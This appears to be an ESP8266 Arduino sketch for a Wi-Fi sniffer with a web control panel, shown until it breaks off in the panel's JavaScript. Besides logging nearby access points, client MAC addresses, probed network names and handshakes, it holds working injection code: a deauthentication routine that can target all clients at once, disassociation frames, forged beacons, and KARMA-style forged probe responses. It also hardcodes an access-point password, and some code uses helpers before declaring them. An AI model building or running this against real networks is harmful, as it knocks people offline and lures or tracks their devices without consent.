#include <ESP8266WiFi.h>
#include <Ticker.h>
#include <ESP8266WebServer.h>

extern "C" {
#include <user_interface.h>
}

// Simple, robust Wi-Fi scanner + 802.11 packet sniffer for ESP8266
// Serial controls:
//   s  -> scan networks
//   p  -> start promiscuous sniffing (channel hopping)
//   x  -> stop sniffing
//   cN -> lock to channel N (1-14), e.g. c6
// Web UI:
//   SoftAP SSID: ESP8266-Sniffer (open)
//   Visit http://192.168.4.1/ for controls
//
// Notes:
// - Sniffing requires station mode and being disconnected from APs
// - Printing is throttled to avoid WDT resets
// - Channel hopping runs at 4 hops/sec by default

// -------------------- Types and helpers --------------------
typedef struct __attribute__((packed)) {
  uint16_t frameControl;
  uint16_t durationId;
  uint8_t addr1[6];  // Receiver / Destination
  uint8_t addr2[6];  // Transmitter / Source
  uint8_t addr3[6];  // BSSID
  uint16_t sequenceControl;
  // Followed by optional addr4 for WDS frames; we don't parse it here
} WifiMacHeader;

typedef struct __attribute__((packed)) {
  WifiMacHeader header;
  uint8_t payload[0];
} WifiMacPacket;

// Local definitions compatible with SDK types across core versions
typedef struct __attribute__((packed)) {
  int8_t rssi;
  uint8_t rate : 4;
  uint8_t is_group : 1;
  uint8_t reserved1 : 1;
  uint8_t sig_mode : 2;
  uint16_t legacy_length : 12;
  uint8_t damatch0 : 1;
  uint8_t damatch1 : 1;
  uint8_t bssidmatch0 : 1;
  uint8_t bssidmatch1 : 1;
  uint8_t MCS : 7;
  uint8_t CWB : 1;
  uint16_t HT_length;
  uint8_t Smoothing : 1;
  uint8_t Not_Sounding : 1;
  uint8_t reserved2 : 1;
  uint8_t Aggregation : 1;
  uint8_t STBC : 2;
  uint8_t FEC_CODING : 1;
  uint8_t SGI : 1;
  uint8_t rxend_state;
  uint8_t ampdu_cnt;
  uint8_t channel : 4;
  uint8_t reserved3 : 4;
  uint16_t reserved4;
} SnifferRxCtrl;

typedef struct __attribute__((packed)) {
  SnifferRxCtrl rx_ctrl;
  uint8_t payload[0];
} SnifferPacket;

// -------------------- Observation models --------------------
struct APInfo {
  uint8_t bssid[6];
  char ssid[33];
  bool hidden;
  int8_t lastRssi;
  uint8_t channel;
  uint16_t beaconInterval;
  uint8_t dtimPeriod;
  bool privacy;
  bool shortPreamble;
  bool qosWmm;
  char security[16];   // e.g. OPEN/WEP/WPA2/WPA3
  char cipher[16];     // e.g. CCMP/TKIP
  char auth[16];       // e.g. PSK/SAE/802.1X
  char country[4];     // e.g. "US"
  char rates[96];      // supported rates summary string
  char vendor[24];
  uint16_t clientCount;
  uint32_t mgmtCount;
  uint32_t dataCount;
  uint32_t ctrlCount;
  uint32_t lastSeenMs;
  uint32_t beaconCount;
  uint32_t eapolCount;
};

struct ClientInfo {
  uint8_t mac[6];
  int8_t lastRssi;
  uint8_t lastChannel;
  bool locallyAdmin;
  char expectedAuth[16];
  char pnl[5][33];
  uint8_t pnlCount;
  uint32_t lastSeenMs;
  char vendor[24];
  uint16_t roamCount;
  uint8_t associatedBssid[6];
  uint16_t channelHits[15]; // 1..14 used
  uint32_t eapolCount;
  uint32_t lastEapolMs;
  bool handshakeSeen;
};

static APInfo g_aps[32];
static ClientInfo g_clients[64];

static int findApIndexByBssid(const uint8_t bssid[6]) {
  for (int i = 0; i < (int)(sizeof(g_aps)/sizeof(g_aps[0])); i++) {
    bool used = false;
    for (int j = 0; j < 6; j++) if (g_aps[i].bssid[j] != 0) { used = true; break; }
    if (!used) continue;
    bool match = true;
    for (int j = 0; j < 6; j++) if (g_aps[i].bssid[j] != bssid[j]) { match = false; break; }
    if (match) return i;
  }
  return -1;
}

static int ensureApIndex(const uint8_t bssid[6]) {
  int idx = findApIndexByBssid(bssid);
  if (idx >= 0) return idx;
  // find free slot or LRU
  int freeIdx = -1;
  uint32_t oldest = 0xFFFFFFFF;
  int oldestIdx = 0;
  for (int i = 0; i < (int)(sizeof(g_aps)/sizeof(g_aps[0])); i++) {
    bool used = false;
    for (int j = 0; j < 6; j++) if (g_aps[i].bssid[j] != 0) { used = true; break; }
    if (!used) { freeIdx = i; break; }
    if (g_aps[i].lastSeenMs < oldest) { oldest = g_aps[i].lastSeenMs; oldestIdx = i; }
  }
  idx = (freeIdx >= 0) ? freeIdx : oldestIdx;
  memset(&g_aps[idx], 0, sizeof(g_aps[idx]));
  memcpy(g_aps[idx].bssid, bssid, 6);
  strncpy(g_aps[idx].ssid, "", sizeof(g_aps[idx].ssid));
  strncpy(g_aps[idx].security, "?", sizeof(g_aps[idx].security));
  strncpy(g_aps[idx].cipher, "?", sizeof(g_aps[idx].cipher));
  strncpy(g_aps[idx].auth, "?", sizeof(g_aps[idx].auth));
  g_aps[idx].country[0] = 0;
  g_aps[idx].rates[0] = 0;
  strncpy(g_aps[idx].vendor, lookupVendorFromOui(bssid), sizeof(g_aps[idx].vendor));
  return idx;
}

static int findClientIndexByMac(const uint8_t mac[6]) {
  for (int i = 0; i < (int)(sizeof(g_clients)/sizeof(g_clients[0])); i++) {
    bool used = false;
    for (int j = 0; j < 6; j++) if (g_clients[i].mac[j] != 0) { used = true; break; }
    if (!used) continue;
    bool match = true;
    for (int j = 0; j < 6; j++) if (g_clients[i].mac[j] != mac[j]) { match = false; break; }
    if (match) return i;
  }
  return -1;
}

static int ensureClientIndex(const uint8_t mac[6]) {
  int idx = findClientIndexByMac(mac);
  if (idx >= 0) return idx;
  int freeIdx = -1; uint32_t oldest = 0xFFFFFFFF; int oldestIdx = 0;
  for (int i = 0; i < (int)(sizeof(g_clients)/sizeof(g_clients[0])); i++) {
    bool used = false;
    for (int j = 0; j < 6; j++) if (g_clients[i].mac[j] != 0) { used = true; break; }
    if (!used) { freeIdx = i; break; }
    if (g_clients[i].lastSeenMs < oldest) { oldest = g_clients[i].lastSeenMs; oldestIdx = i; }
  }
  idx = (freeIdx >= 0) ? freeIdx : oldestIdx;
  memset(&g_clients[idx], 0, sizeof(g_clients[idx]));
  memcpy(g_clients[idx].mac, mac, 6);
  g_clients[idx].locallyAdmin = (mac[0] & 0x02) != 0;
  strncpy(g_clients[idx].expectedAuth, "?", sizeof(g_clients[idx].expectedAuth));
  strncpy(g_clients[idx].vendor, lookupVendorFromOui(mac), sizeof(g_clients[idx].vendor));
  return idx;
}

// RSN/WPA helpers
static void setStr(char *dst, size_t dstLen, const char *src) {
  strncpy(dst, src, dstLen);
  dst[dstLen - 1] = 0;
}

static const char *cipherSuiteToStr(uint32_t ouiType) {
  switch (ouiType) {
    case 0x000FAC00: return "USE-GROUP"; // group
    case 0x000FAC01: return "WEP40";
    case 0x000FAC02: return "TKIP";
    case 0x000FAC04: return "CCMP";
    case 0x000FAC05: return "WEP104";
    default: return "?";
  }
}

static const char *akmSuiteToStr(uint32_t ouiType) {
  switch (ouiType) {
    case 0x000FAC01: return "802.1X";
    case 0x000FAC02: return "PSK";
    case 0x000FAC08: return "SAE"; // WPA3-Personal
    default: return "?";
  }
}

static void parseRsn(const uint8_t *ie, uint8_t len, APInfo &ap) {
  if (len < 4) return; // version
  const uint8_t *p = ie + 2; // skip version
  uint8_t rem = len - 2;
  if (rem < 4) return; // group cipher
  uint32_t group = (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
  p += 4; rem -= 4;
  if (rem < 2) return;
  uint16_t pairCount = p[0] | (p[1] << 8); p += 2; rem -= 2;
  const char *pairStr = "?";
  if (rem >= 4 && pairCount >= 1) {
    uint32_t pair = (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
    pairStr = cipherSuiteToStr(pair);
    p += 4; rem -= 4 * pairCount; // skip pairs
  }
  if (rem < 2) return;
  uint16_t akmCount = p[0] | (p[1] << 8); p += 2; rem -= 2;
  const char *akmStr = "?";
  if (rem >= 4 && akmCount >= 1) {
    uint32_t akm = (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
    akmStr = akmSuiteToStr(akm);
  }
  setStr(ap.cipher, sizeof(ap.cipher), pairStr);
  setStr(ap.auth, sizeof(ap.auth), akmStr);
  setStr(ap.security, sizeof(ap.security), (strcmp(akmStr, "SAE") == 0) ? "WPA3" : "WPA2");
}

static void updateApFromMgmt(const WifiMacPacket *mp, const uint8_t *body, uint16_t bodyLen, int8_t rssi) {
  // Beacon/probe resp fixed params: TSF(8) + beaconInterval(2) + capab(2)
  if (bodyLen < 12) return;
  const uint8_t *p = body;
  // skip TSF
  p += 8;
  uint16_t beaconInt = p[0] | (p[1] << 8); p += 2;
  uint16_t cap = p[0] | (p[1] << 8); p += 2;
  uint16_t ieLen = bodyLen - 12;
  const uint8_t *ie = body + 12;

  int idx = ensureApIndex(mp->header.addr3); // BSSID
  APInfo &ap = g_aps[idx];
  ap.lastRssi = rssi;
  ap.beaconInterval = beaconInt;
  ap.shortPreamble = (cap & (1 << 5)) != 0;
  ap.privacy = (cap & (1 << 4)) != 0;
  ap.beaconCount++;
  ap.lastSeenMs = millis();

  while (ieLen >= 2) {
    uint8_t id = ie[0];
    uint8_t len = ie[1];
    if (ieLen < (uint16_t)(2 + len)) break;
    const uint8_t *val = ie + 2;
    switch (id) {
      case 0: { // SSID
        uint8_t copyLen = (len < 32) ? len : 32;
        memcpy(ap.ssid, val, copyLen);
        ap.ssid[copyLen] = 0;
        ap.hidden = (len == 0);
        break;
      }
      case 1: { // Supported Rates
        for (uint8_t i = 0; i < len; i++) {
          uint8_t r = val[i];
          bool basic = (r & 0x80) != 0;
          float mbps = (r & 0x7F) * 0.5f;
          char tmp[12];
          if (basic) snprintf(tmp, sizeof(tmp), "%.1f*", mbps);
          else snprintf(tmp, sizeof(tmp), "%.1f", mbps);
          if (ap.rates[0] != '\\0') strncat(ap.rates, ",", sizeof(ap.rates) - strlen(ap.rates) - 1);
          strncat(ap.rates, tmp, sizeof(ap.rates) - strlen(ap.rates) - 1);
        }
        break;
      }
      case 3: { // DS Parameter Set (channel)
        ap.channel = val[0];
        break;
      }
      case 5: { // TIM
        if (len >= 2) ap.dtimPeriod = val[1];
        break;
      }
      case 7: { // Country
        if (len >= 2) {
          uint8_t cpy = len >= 3 ? 3 : 2;
          memcpy(ap.country, val, cpy);
          ap.country[cpy] = 0;
        }
        break;
      }
      case 50: { // Extended Supported Rates
        for (uint8_t i = 0; i < len; i++) {
          uint8_t r = val[i];
          bool basic = (r & 0x80) != 0;
          float mbps = (r & 0x7F) * 0.5f;
          char tmp[12];
          if (ap.rates[0] != '\\0') strncat(ap.rates, ",", sizeof(ap.rates) - strlen(ap.rates) - 1);
          snprintf(tmp, sizeof(tmp), "%.1f", mbps);
          strncat(ap.rates, tmp, sizeof(ap.rates) - strlen(ap.rates) - 1);
        }
        break;
      }
      case 48: // RSN
        parseRsn(val, len, ap);
        break;
      case 221: { // Vendor specific, look for WMM and WPA1
        if (len >= 4) {
          uint32_t ouiType = (val[0] << 24) | (val[1] << 16) | (val[2] << 8) | val[3];
          if (ouiType == 0x0050F202) { // WMM/WME info
            ap.qosWmm = true;
          } else if (ouiType == 0x0050F201) {
            // WPA1 - treat as WPA, cipher/auth approximate
            setStr(ap.security, sizeof(ap.security), "WPA");
          }
        }
        break;
      }
      default:
        break;
    }
    ie += 2 + len;
    ieLen -= 2 + len;
  }
}

static void updateClientFromMgmt(const WifiMacPacket *mp, const uint8_t *body, uint16_t bodyLen, int8_t rssi, uint8_t subtype) {
  int idx = ensureClientIndex(mp->header.addr2); // transmitter/source is client
  ClientInfo &cl = g_clients[idx];
  cl.lastRssi = rssi;
  cl.lastChannel = wifi_get_channel();
  cl.lastSeenMs = millis();
  // Parse IEs for SSID (PNL) and RSN for expected auth
  if (subtype == 0x04 /* ProbeReq */ || subtype == 0x00 /* AssocReq */ || subtype == 0x02 /* ReassocReq */) {
    const uint8_t *ie = body;
    uint16_t ieLen = bodyLen;
    while (ieLen >= 2) {
      uint8_t id = ie[0];
      uint8_t len = ie[1];
      if (ieLen < (uint16_t)(2 + len)) break;
      const uint8_t *val = ie + 2;
      if (id == 0 && len > 0 && cl.pnlCount < 5) {
        uint8_t copyLen = (len < 32) ? len : 32;
        memcpy(cl.pnl[cl.pnlCount], val, copyLen);
        cl.pnl[cl.pnlCount][copyLen] = 0;
        cl.pnlCount++;
      } else if ((id == 48 || id == 221) && len > 0) {
        // RSN/WPA expected auth
        // Simplified: assume RSN present => WPA2/3; WPA OUI => WPA
        setStr(cl.expectedAuth, sizeof(cl.expectedAuth), (id == 221) ? "WPA" : "WPA2/3");
      }
      ie += 2 + len;
      ieLen -= 2 + len;
    }
  }
}

static inline uint8_t getFrameType(uint16_t frameControl) {
  return (frameControl & 0x000C) >> 2;  // bits 2..3
}

static inline uint8_t getFrameSubtype(uint16_t frameControl) {
  return (frameControl & 0x00F0) >> 4;  // bits 4..7
}

static void formatMac(const uint8_t mac[6], char *out, size_t outLen) {
  snprintf(out, outLen, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Overload to support volatile MAC buffers without casts
static void formatMac(const volatile uint8_t mac[6], char *out, size_t outLen) {
  uint8_t copy[6];
  for (int i = 0; i < 6; i++) copy[i] = mac[i];
  formatMac(copy, out, outLen);
}

static const char *lookupVendorFromOui(const uint8_t mac[6]) {
  struct { uint8_t p[3]; const char *n; } m[] = {
    {{0xFC,0xFB,0xFB}, "Apple"}, {{0xD8,0x6C,0x63}, "Apple"},
    {{0x80,0xEA,0x96}, "Samsung"}, {{0xE8,0x50,0x8B}, "Samsung"},
    {{0x3C,0x2E,0xFF}, "Huawei"}, {{0xF0,0x9F,0xC2}, "Xiaomi"},
    {{0x18,0xD6,0xC7}, "Ubiquiti"}, {{0xB4,0xFB,0xE4}, "Ubiquiti"},
    {{0xF4,0xF5,0xE8}, "TP-Link"}, {{0xC8,0xD7,0x19}, "Cisco"},
  };
  for (unsigned i = 0; i < sizeof(m)/sizeof(m[0]); i++)
    if (m[i].p[0]==mac[0] && m[i].p[1]==mac[1] && m[i].p[2]==mac[2]) return m[i].n;
  return "Unknown";
}

static const char *frameTypeToStr(uint8_t type) {
  switch (type) {
    case 0: return "MGMT";
    case 1: return "CTRL";
    case 2: return "DATA";
    default: return "RESV";
  }
}

static const char *mgmtSubtypeToStr(uint8_t subtype) {
  switch (subtype) {
    case 0x00: return "AssocReq";
    case 0x01: return "AssocResp";
    case 0x02: return "ReassocReq";
    case 0x03: return "ReassocResp";
    case 0x04: return "ProbeReq";
    case 0x05: return "ProbeResp";
    case 0x08: return "Beacon";
    case 0x09: return "ATIM";
    case 0x0A: return "Disassoc";
    case 0x0B: return "Auth";
    case 0x0C: return "Deauth";
    default: return "Mgmt";
  }
}

// -------------------- Deauth test state --------------------
volatile bool deauthTestActive = false;
volatile uint8_t deauthTarget[6] = {0};
volatile uint8_t deauthBssid[6] = {0};
volatile uint32_t deauthSentCount = 0;
volatile bool deauthBroadcast = false;  // if true, destination is broadcast (all clients)
volatile uint32_t deauthIntervalMs = 100; // default ~10 pps
volatile uint32_t deauthEndAtMs = 0;      // 0 = no auto stop

// Add this function to send deauthentication frames
void sendDeauth() {
  if (!deauthTestActive) return;
  if (deauthEndAtMs != 0) {
    uint32_t now = millis();
    if (now >= deauthEndAtMs) {
      deauthTestActive = false;
      deauthBroadcast = false;
      deauthTicker.detach();
      return;
    }
  }
  
  // Construct deauthentication frame (management frame type 0, subtype 12)
  uint8_t packet[26] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast or target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source (your AP's MAC)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (your AP's MAC)
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code (7 = Class 3 frame received from nonassociated STA)
  };

  // Fill in MAC addresses
  uint8_t targetCopy[6];
  uint8_t bssidCopy[6];
  for (int i = 0; i < 6; i++) {
    targetCopy[i] = deauthTarget[i];
    bssidCopy[i] = deauthBssid[i];
  }
  memcpy(&packet[4], targetCopy, 6);    // Destination
  memcpy(&packet[10], bssidCopy, 6);    // Source
  memcpy(&packet[16], bssidCopy, 6);    // BSSID

  // Send the packet
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
  deauthSentCount++;
}

// -------------------- Sniffer state --------------------
Ticker channelHopTicker;
volatile bool snifferActive = false;
volatile uint8_t currentChannel = 1;
volatile uint32_t sniffedPacketCount = 0;
volatile uint32_t deauthCount = 0;
volatile uint32_t disassocCount = 0;

Ticker deauthTicker;

// -------------------- Injection/KARMA/Utilization state --------------------
volatile bool karmaActive = false;
uint8_t karmaBssid[6] = {0};

// Channel utilization (rolling 1s window snapshot)
volatile uint32_t chPps[15] = {0};
volatile uint32_t chPpsLast[15] = {0};
volatile uint16_t chActiveTxLast[15] = {0};

// Tiny unique-transmitter cache per channel for the last window
struct UniqueTxCache {
  uint8_t macs[24][6];
  uint8_t count;
};
static UniqueTxCache uniqueTx[15];

static inline bool macEquals(const uint8_t a[6], const uint8_t b[6]) {
  for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false; return true;
}
static inline bool macIsZero(const uint8_t a[6]) {
  for (int i = 0; i < 6; i++) if (a[i] != 0) return false; return true;
}
static void addUniqueTx(uint8_t ch, const uint8_t mac[6]) {
  if (ch < 1 || ch > 14) return;
  UniqueTxCache &c = uniqueTx[ch];
  for (uint8_t i = 0; i < c.count; i++) {
    if (macEquals(c.macs[i], mac)) return;
  }
  if (c.count < 24) {
    memcpy(c.macs[c.count], mac, 6);
    c.count++;
  } else {
    // simple FIFO eviction
    memmove(&c.macs[0], &c.macs[1], (23) * 6);
    memcpy(c.macs[23], mac, 6);
  }
}

// Helper: parse MAC string "AA:BB:CC:DD:EE:FF"
static bool parseMac(const String &s, uint8_t out[6]) {
  unsigned int b[6];
  if (sscanf(s.c_str(), "%2x:%2x:%2x:%2x:%2x:%2x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

// Build and send a minimal beacon frame
static void sendBeaconOnce(const char *ssid, const uint8_t bssid[6], uint8_t channel, uint16_t beaconIntervalMs) {
  uint8_t buf[200];
  uint8_t *p = buf;
  // Frame control + duration
  *p++ = 0x80; *p++ = 0x00; // Beacon
  *p++ = 0x00; *p++ = 0x00; // duration
  // Addr1 (DA): broadcast
  memset(p, 0xFF, 6); p += 6;
  // Addr2 (SA): BSSID
  memcpy(p, bssid, 6); p += 6;
  // Addr3 (BSSID)
  memcpy(p, bssid, 6); p += 6;
  // Seq ctrl
  *p++ = 0x00; *p++ = 0x00;
  // Fixed params: TSF(8)
  memset(p, 0x00, 8); p += 8;
  // Beacon interval (TU). Convert ms to TUs (~1.024ms)
  uint16_t tu = (uint16_t)(beaconIntervalMs / 1.024f);
  *p++ = (uint8_t)(tu & 0xFF); *p++ = (uint8_t)(tu >> 8);
  // Capabilities: ESS set, no privacy
  *p++ = 0x01; *p++ = 0x00;
  // SSID IE
  size_t ssidLen = strnlen(ssid, 32);
  *p++ = 0x00; *p++ = (uint8_t)ssidLen; memcpy(p, ssid, ssidLen); p += ssidLen;
  // Supported rates IE: 1,2,5.5,11 as basic
  static const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  *p++ = 0x01; *p++ = sizeof(rates); memcpy(p, rates, sizeof(rates)); p += sizeof(rates);
  // DS parameter set (channel)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;
  // send
  wifi_send_pkt_freedom(buf, (int)(p - buf), 0);
}

// Build and send a minimal probe response
static void sendProbeRespOnce(const char *ssid, const uint8_t bssid[6], const uint8_t dst[6], uint8_t channel) {
  uint8_t buf[200];
  uint8_t *p = buf;
  *p++ = 0x50; *p++ = 0x00; // Probe Response
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, dst, 6); p += 6;     // DA = client
  memcpy(p, bssid, 6); p += 6;   // SA = BSSID
  memcpy(p, bssid, 6); p += 6;   // BSSID
  *p++ = 0x00; *p++ = 0x00;      // seq
  memset(p, 0x00, 8); p += 8;    // TSF
  *p++ = 0x64; *p++ = 0x00;      // beacon interval 100 TU
  *p++ = 0x01; *p++ = 0x00;      // caps: ESS
  size_t ssidLen = strnlen(ssid, 32);
  *p++ = 0x00; *p++ = (uint8_t)ssidLen; memcpy(p, ssid, ssidLen); p += ssidLen;
  static const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  *p++ = 0x01; *p++ = sizeof(rates); memcpy(p, rates, sizeof(rates)); p += sizeof(rates);
  *p++ = 0x03; *p++ = 0x01; *p++ = channel; // DS param
  wifi_send_pkt_freedom(buf, (int)(p - buf), 0);
}

static void sendDisassocOnce(const uint8_t target[6], const uint8_t bssid[6], uint16_t reason) {
  uint8_t packet[26] = {
    0xA0, 0x00,  // Disassociation
    0x00, 0x00,
    0,0,0,0,0,0, // DA
    0,0,0,0,0,0, // SA
    0,0,0,0,0,0, // BSSID
    0x00, 0x00,  // seq
    0x00, 0x00   // reason
  };
  memcpy(&packet[4], target, 6);
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  packet[24] = (uint8_t)(reason & 0xFF);
  packet[25] = (uint8_t)(reason >> 8);
  wifi_send_pkt_freedom(packet, sizeof(packet), 0);
}

// Throttle printing to avoid watchdog resets
uint32_t lastPrintMillis = 0;
const uint32_t printIntervalMs = 30;  // minimum ms between prints

// -------------------- Web server / SoftAP --------------------
ESP8266WebServer server(80);
const char *apSsid = "Magesium";
const char *apPass = "M4ges1um"; // WPA2 PSK (8-63 chars)
IPAddress apIp(192, 168, 4, 1);
IPAddress apGw(192, 168, 4, 1);
IPAddress apMask(255, 255, 255, 0);

String buildStatusJson() {
  String s = "{";
  s += "\"snifferActive\":"; s += (snifferActive ? "true" : "false"); s += ",";
  s += "\"currentChannel\":"; s += String(currentChannel); s += ",";
  s += "\"sniffedPacketCount\":"; s += String(sniffedPacketCount); s += ",";
  s += "\"deauthCount\":"; s += String(deauthCount); s += ",";
  s += "\"disassocCount\":"; s += String(disassocCount); s += ",";
  s += "\"uptimeMs\":"; s += String(millis()); s += ",";
  s += "\"apSsid\":\""; s += apSsid; s += "\",";
  s += "\"apIp\":\"192.168.4.1\",";
  s += "\"deauthTestActive\":"; s += (deauthTestActive ? "true" : "false"); s += ",";
  s += "\"deauthSentCount\":"; s += String(deauthSentCount); s += ",";
  s += "\"deauthBroadcast\":"; s += (deauthBroadcast ? "true" : "false"); s += ",";
  s += "\"deauthRatePps\":"; s += String(deauthIntervalMs ? (1000UL / deauthIntervalMs) : 0); s += ",";
  s += "\"deauthEndsAtMs\":"; s += String(deauthEndAtMs); s += ",";
  
  char macStr[18];
  if (deauthTestActive) {
    formatMac(deauthTarget, macStr, sizeof(macStr));
    s += "\"deauthTarget\":\""; s += macStr; s += "\",";
    formatMac(deauthBssid, macStr, sizeof(macStr));
    s += "\"deauthBssid\":\""; s += macStr; s += "\"";
  } else {
    s += "\"deauthTarget\":\"\",\"deauthBssid\":\"\"";
  }
  s += "}";
  return s;
}

void startAccessPoint(uint8_t channel) {
  // Configure AP IP
  WiFi.softAPConfig(apIp, apGw, apMask);
  // Protected network (WPA2-PSK), hidden=false, max_conn=2
  WiFi.softAP(apSsid, apPass, channel, false, 2);
}

void restartAccessPointOnChannel(uint8_t channel) {
  if (WiFi.getMode() & WIFI_AP) {
    WiFi.softAPdisconnect(true);
    delay(20);
    startAccessPoint(channel);
  }
}

const char INDEX_HTML[] PROGMEM = R"HTML(
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ESP8266 Matrix Sniffer</title>
  <style>
    :root {
      --bg: #000;
      --fg: #00ff9c;
      --fg-dim: #0f7;
      --card: rgba(0, 32, 0, 0.4);
      --border: rgba(0, 255, 156, 0.2);
      --accent: #00e676;
      --danger: #ff5252;
    }
    html, body { height: 100%; }
    body {
      margin: 0; background: var(--bg); color: var(--fg);
      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      overflow-x: hidden;
    }
    #matrixCanvas { position: fixed; inset: 0; z-index: 0; opacity: .15; }
    .container { position: relative; z-index: 1; padding: 16px; }
    h1 { font-size: 18px; margin: 0 0 12px; letter-spacing: 1px; text-shadow: 0 0 8px var(--fg); }
    .nav { display:flex; gap:8px; margin: 8px 0 12px; flex-wrap: wrap; }
    .tab { background: transparent; color: var(--fg); border: 1px solid var(--border); padding: 8px 12px; border-radius: 4px; cursor: pointer; transition: all .15s; }
    .tab.active, .tab:hover { background: var(--card); box-shadow: inset 0 0 0 1px var(--accent), 0 0 12px rgba(0,255,156,.2); }
    .grid { display: grid; gap: 12px; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 12px; backdrop-filter: blur(2px); }
    .row { margin: 8px 0; display:flex; gap:8px; align-items:center; flex-wrap: wrap; }
    .btn { background: transparent; color: var(--fg); border: 1px solid var(--accent); padding: 8px 12px; border-radius: 4px; cursor: pointer; }
    .btn:hover { background: rgba(0,255,156,.08); box-shadow: 0 0 8px rgba(0,255,156,.3); }
    .btn-danger { border-color: var(--danger); color:#fff; }
    .btn-danger:hover { background: rgba(255,82,82,.12); box-shadow: 0 0 8px rgba(255,82,82,.3); }
    input, select { background: #001b12; color: var(--fg); border: 1px solid var(--border); padding: 6px 8px; border-radius: 4px; }
    input[type="text"] { width: 220px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 6px 8px; border-bottom: 1px solid var(--border); font-size: 12px; }
    th { color: var(--fg-dim); font-weight: 600; }
    pre { background: #00120b; color: var(--fg); padding: 8px; border-radius: 4px; max-height: 260px; overflow: auto; border: 1px solid var(--border); }
    .led { display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:8px; vertical-align:middle; background:#073; box-shadow:0 0 8px rgba(0,255,156,.4);} 
    .on { background:#0f7; }
    .idle { background:#5a0; }
    .off { background:#073; opacity:.6; }
    .hide { display:none; }
    .pill { padding:2px 6px; border:1px solid var(--border); border-radius:999px; background:#001a12; }
    .bar { height:10px; background:#003a2a; border:1px solid var(--border); border-radius:3px; overflow:hidden; }
    .bar > span { display:block; height:100%; background: linear-gradient(90deg, #00ff9c, #00c853); }
  </style>
  <script>
    // Matrix rain background
    function startMatrix() {
      const c = document.getElementById('matrixCanvas');
      const ctx = c.getContext('2d');
      function resize(){ c.width = window.innerWidth; c.height = window.innerHeight; cols = Math.floor(c.width / 14); drops = new Array(cols).fill(1); }
      let cols = 0, drops = [];
      resize(); window.addEventListener('resize', resize);
      const chars = 'アァカサタナハマヤャラワ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#$%&*+-/<=>?';
      function draw(){
        ctx.fillStyle = 'rgba(0, 0, 0, 0.06)'; ctx.fillRect(0,0,c.width,c.height);
        ctx.fillStyle = '#00ff9c'; ctx.font = '14px monospace';
        for (let i = 0; i < drops.length; i++) {
          const text = chars.charAt(Math.floor(Math.random()*chars.length));
          ctx.fillText(text, i*14, drops[i]*14);
          if (drops[i]*14 > c.height && Math.random() > 0.975) drops[i] = 0;
          drops[i]++;
        }
        requestAnimationFrame(draw);
      }
      draw();
    }

    function show(view) {
      document.querySelectorAll('.view').forEach(v => v.classList.add('hide'));
      document.getElementById(view).classList.remove('hide');
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelector(`[data-view="${view}"]`).classList.add('active');
      if (view === 'observations') loadObservations();
    }

    async function call(path) {
      const r = await fetch(path);
      return r.ok ? r.text() : Promise.reject(await r.text());
    }
    async function status() {
      const r = await fetch('/status');
      const j = await r.json();
      document.getElementById('status').textContent = JSON.stringify(j);
      const led = document.getElementById('led');
      const sActive = !!j.snifferActive;
      const now = Date.now();
      const prevCount = window._prevCount ?? 0;
      const prevTime = window._prevTime ?? now;
      const pps = (j.sniffedPacketCount - prevCount) / Math.max(1, (now - prevTime) / 1000);
      document.getElementById('pkt').textContent = j.sniffedPacketCount;
      document.getElementById('pps').textContent = Math.max(0, Math.round(pps));
      document.getElementById('chNow').textContent = j.currentChannel;
      document.getElementById('deauth').textContent = j.deauthCount ?? 0;
      document.getElementById('disassoc').textContent = j.disassocCount ?? 0;
      const deauthActive = !!j.deauthTestActive;
      document.getElementById('deauthStatus').textContent = deauthActive ? 'Active' : 'Inactive';
      document.getElementById('deauthCount').textContent = j.deauthSentCount || 0;
      const bc = !!j.deauthBroadcast;
      document.getElementById('broadcastDeauth').checked = bc;
      document.getElementById('deauthTarget').disabled = bc;
      if (document.getElementById('deauthRateNow')) {
        document.getElementById('deauthRateNow').textContent = j.deauthRatePps || 0;
      }
      if (deauthActive) {
        document.getElementById('deauthTarget').value = j.deauthTarget || '';
        document.getElementById('deauthBssid').value = j.deauthBssid || '';
      }
      led.className = 'led ' + (sActive ? (pps > 0 ? 'on' : 'idle') : 'off');
      window._prevCount = j.sniffedPacketCount; window._prevTime = now;
    }
    async function setCh() {
      const ch = document.getElementById('ch').value;
      await call('/setChannel?ch=' + encodeURIComponent(ch));
      status();
    }
    async function hop(on) { await call('/hop?enable=' + (on ? '1' : '0')); status(); }

    async function scan() {
      const full = document.getElementById('fullScan').checked;
      const r = await fetch('/scan?full=' + (full ? '1' : '0'));
      const j = await r.json();
      const tbody = document.getElementById('scanBody'); tbody.innerHTML = '';
      j.networks.forEach(n => {
        const tr = document.createElement('tr');
